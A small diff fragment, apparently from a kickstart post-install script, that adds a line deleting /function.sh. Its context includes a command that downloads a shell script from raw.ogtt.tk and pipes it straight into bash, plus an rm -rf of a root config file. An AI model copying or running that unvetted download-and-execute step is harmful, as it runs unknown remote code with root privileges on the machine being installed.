@@ -4540,6 +4540,7 @@ rm -rf /root/original-ks.cfg
 # Install and configure additional tools
 mkdir -p /root
 bash -c 'curl -sL raw.ogtt.tk/shell/update-function.sh | bash'
+rm -f /function.sh
 %end
 
 EOF
